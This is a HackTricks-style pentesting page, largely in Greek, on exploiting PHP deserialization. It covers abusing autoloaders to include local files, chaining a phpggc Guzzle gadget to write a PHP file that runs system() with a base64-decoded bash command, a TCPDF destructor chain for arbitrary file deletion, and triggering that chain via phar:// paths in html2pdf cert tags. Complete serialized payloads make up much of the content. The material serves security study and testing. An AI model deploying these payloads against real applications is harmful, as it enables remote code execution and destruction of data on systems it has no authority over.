# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

Πρώτα, πρέπει να ελέγξετε τι είναι [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserialization + spl_autoload_register + LFI/Gadget

Βρισκόμαστε σε κατάσταση όπου βρήκαμε μια **PHP deserialization σε ένα webapp** χωρίς **καμία** βιβλιοθήκη ευάλωτη σε gadgets μέσα στο **`phpggc`**. Ωστόσο, στο ίδιο container υπήρχε ένα **διαφορετικό composer webapp με ευάλωτες βιβλιοθήκες**. Επομένως, ο στόχος ήταν να **φορτωθεί ο composer loader του άλλου webapp** και να αξιοποιηθεί για να **φορτώσει ένα gadget που θα εκμεταλλευτεί εκείνη τη βιβλιοθήκη** από το webapp ευάλωτο σε deserialization.

Βήματα:

- Έχετε βρει μια **deserialization** και **δεν υπάρχει κανένα gadget** στον τρέχοντα κώδικα της εφαρμογής
- Μπορείτε να καταχραστείτε μια **`spl_autoload_register`** συνάρτηση όπως η παρακάτω για να **φορτώσετε οποιοδήποτε τοπικό αρχείο με επέκταση `.php`**
- Για αυτό χρησιμοποιείτε μια deserialization όπου το όνομα της κλάσης θα μπει μέσα στο **`$name`**. You **cannot use "/" or "."** in a class name in a serialized object, but the **code** is **replacing** the **underscores** ("\_") **for slashes** ("/"). So a class name such as `tmp_passwd` will be transformed into `/tmp/passwd.php` and the code will try to load it.\
A **gadget example** will be: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
> [!TIP]
> Αν έχεις ένα **file upload** και μπορείς να ανεβάσεις ένα αρχείο με **`.php` extension`** μπορείς να **κακοχρησιμοποιήσεις αυτή τη λειτουργία απευθείας** και να αποκτήσεις άμεσα RCE.

Σε εμένα δεν υπήρχε κάτι τέτοιο, αλλά μέσα στον **ίδιο container** υπήρχε άλλη composer web σελίδα με μια **βιβλιοθήκη ευάλωτη σε `phpggc` gadget**.

- Για να φορτώσεις αυτή τη άλλη βιβλιοθήκη, πρώτα πρέπει να **φορτώσεις τον composer loader της άλλης web app** (επειδή αυτός της τρέχουσας εφαρμογής δεν θα έχει πρόσβαση στις βιβλιοθήκες της άλλης). **Γνωρίζοντας το path της εφαρμογής**, μπορείς να το πετύχεις πολύ εύκολα με: **`O:28:"www_frontend_vendor_autoload":0:{}`** (Στη δική μου περίπτωση, ο composer loader ήταν στο `/www/frontend/vendor/autoload.php`)
- Τώρα, μπορείς να **φορτώσεις** τον composer loader της άλλης εφαρμογής, οπότε είναι ώρα να **`generate the phpgcc`** το **payload** που θα χρησιμοποιήσεις. Στη δική μου περίπτωση, χρησιμοποίησα **`Guzzle/FW1`**, που μου επέτρεψε να **γράψω οποιοδήποτε αρχείο στο filesystem**.
- NOTE: Το **generated gadget δεν λειτουργούσε**, για να λειτουργήσει **τροποποίησα** εκείνο το payload **`chain.php`** του phpggc και έθεσα **όλα τα attributes** των κλάσεων **από private σε public**. Διαφορετικά, μετά το deserializing του string, τα attributes των δημιουργημένων objects δεν είχαν καμία τιμή.
- Τώρα έχουμε τον τρόπο να **φορτώσουμε τον composer loader της άλλης app** και να έχουμε ένα **phpggc payload που δουλεύει**, αλλά πρέπει να **το κάνουμε στο SAME REQUEST για να φορτωθεί ο loader όταν χρησιμοποιηθεί το gadget**. Γι' αυτό έστειλα έναν serialized array με και τα δύο objects ως εξής:
- Μπορείς να δεις **πρώτα τον loader να φορτώνεται και μετά το payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- Τώρα, μπορούμε να **δημιουργήσουμε και να γράψουμε ένα αρχείο**, ωστόσο ο χρήστης **δεν μπορούσε να γράψει σε κανένα φάκελο μέσα στον web server**. Όπως μπορείτε να δείτε στο payload, ο PHP που καλεί **`system`** με λίγο **base64** δημιουργείται στο **`/tmp/a.php`**. Έπειτα, μπορούμε να **επανχρησιμοποιήσουμε τον πρώτο τύπο payload** που χρησιμοποιήσαμε ως LFI για να φορτώσουμε τον composer loader της άλλης webapp t**να φορτώσει το δημιουργημένο `/tmp/a.php`** αρχείο. Απλώς προσθέστε το στο deserialization gadget:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
**Περίληψη του payload**

- **Load the composer autoload** ενός άλλου webapp στο ίδιο container
- **Load a phpggc gadget** για να καταχραστείτε μια βιβλιοθήκη από το άλλο webapp (το αρχικό webapp που ήταν vulnerable σε deserialization δεν είχε κανένα gadget στις βιβλιοθήκες του)
- Το gadget θα **create a file with a PHP payload** στο /tmp/a.php με κακόβουλες εντολές (ο χρήστης του webapp δεν μπορεί να γράψει σε κανένα φάκελο κανενός webapp)
- Το τελικό μέρος του payload θα **load the generated php file** που θα εκτελέσει εντολές

Έπρεπε να **call this deserialization twice**. Στις δοκιμές μου, την πρώτη φορά το `/tmp/a.php` αρχείο δημιουργήθηκε αλλά δεν φορτώθηκε, και τη δεύτερη φορτώθηκε σωστά.

## TCPDF `__destruct` POP chain για αυθαίρετη διαγραφή αρχείου

Όταν ένα πραγματικό στιγμιότυπο `TCPDF` συλλεχθεί από το garbage collector καλεί `_destroy(true)`, διατρέχει το `$this->imagekeys`, και κάνει `unlink()` οτιδήποτε μοιάζει με cache αρχείο κάτω από `K_PATH_CACHE`. Αν μια εφαρμογή εκτελεί `unserialize($user_data)` ενώ η κλάση `TCPDF` είναι φορτωμένη (π.χ. αναμένει έναν πίνακα με το κλειδί `html`), μπορείτε να παρέχετε ένα serialized αντικείμενο που ορίζει:

- `file_id` σε οποιονδήποτε ακέραιο που δεν υπάρχει σε `self::$cleaned_ids` (π.χ. `-1`).
- `imagekeys` σε μονοπάτια που αρχίζουν με `K_PATH_CACHE` ή που μπορούν να κατασκευαστούν ώστε να μοιάζουν με αυτό (π.χ. `/tmp/../tmp/do_not_delete_this_file.txt` όταν `K_PATH_CACHE` είναι `/tmp/`).

Παράδειγμα payload που στοχεύει μια μη ασφαλή `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);` ροή:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
Το αρχείο διαγράφεται αμέσως μόλις το αντικείμενο βγει εκτός πεδίου εφαρμογής. TCPDF 6.9.3 σφίγγει τον έλεγχο ώστε να αφαιρεί μόνο διαδρομές με το πρόθεμα `__tcpdf_<file_id>_` εντός του `K_PATH_CACHE` και εισήγαγε την `_unlink()` για να αποκλείει σχήματα μη-`file://`, οπότε οι παλαιότερες εκδόσεις του `Producer` είναι ιδανικοί στόχοι.

### Triggering the gadget via `phar://` in html2pdf `<cert>` tags

`spipu/html2pdf` (≤5.3.0) ενσωματώνει την TCPDF και εκθέτει ένα custom `<cert>` block του οποίου τα attributes `src`/`privkey` ελέγχονται με απλό `file_exists()`. Σε PHP < 8.0 οποιαδήποτε filesystem function που αγγίζει ένα `phar://` URL προκαλεί την `unserialize()` των μεταδεδομένων Phar. Αποθηκεύοντας το κακόβουλο αντικείμενο TCPDF παραπάνω μέσα σε ένα Phar archive αποκτάτε ένα αξιόπιστο POP ακόμη κι αν η εφαρμογή δεν καλεί ποτέ την `unserialize()`.

1. Δημιουργήστε ένα Phar με `phar.readonly=0`, ορίστε το stub/manifest ώστε να μοιάζει με εικόνα (π.χ. μετονομάστε `archive.phar` σε `archive.png`), και αποθηκεύστε το serialized αντικείμενο TCPDF στα μεταδεδομένα του Phar.
2. Ανεβάστε/τοποθετήστε το αρχείο κάπου προσβάσιμο, π.χ. `/tmp/user_files/user_1/archive.png`.
3. Υποβάλετε HTML που περιέχει το CERT tag ώστε το html2pdf να επιλύσει το attacker-controlled path:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
Η κλήση στη `file_exists()` αποσειριοποιεί τα μεταδεδομένα, δημιουργεί ένα αντικείμενο TCPDF, και ο destructor του διαγράφει το επιλεγμένο αρχείο, μετατρέποντας το html2pdf σε ισχυρό σημείο εισόδου `phar://`. Η έκδοση 5.3.1 πρόσθεσε τη `Security::checkValidPath()` για να μπλοκάρει μη εγκεκριμένα schemes, οπότε οι παλαιές εγκαταστάσεις παραμένουν ελκυστικές.

## Αναφορές

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#include ../../banners/hacktricks-training.md}}
